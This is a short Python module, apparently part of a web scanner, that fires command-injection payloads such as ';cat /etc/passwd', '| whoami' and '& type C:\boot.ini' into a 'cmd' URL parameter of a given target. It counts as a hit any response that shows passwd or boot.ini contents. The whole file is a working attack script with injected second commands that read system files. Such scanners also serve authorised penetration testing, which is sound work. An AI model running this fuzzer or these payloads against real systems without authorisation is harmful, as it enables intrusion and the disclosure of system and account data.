import requests

def run(target):
    payloads = [
        ";cat /etc/passwd",
        "| cat /etc/passwd",
        "& type C:\\boot.ini",
        "&& ls",
        "| whoami"
    ]

    reflections = 0
    hits = 0
    sent = 0

    for payload in payloads:
        try:
            url = f"{target}?cmd={payload}"
            r = requests.get(url, timeout=6)
            sent += 1
            if "root:x:" in r.text or "boot loader" in r.text or "windows" in r.text:
                hits += 1
            if payload in r.text:
                reflections += 1
        except:
            continue

    return {
        "module": "fuzz_cmd",
        "payloads_sent": sent,
        "reflections": reflections,
        "hits": hits,
        "notes": "Command injection test"
    }
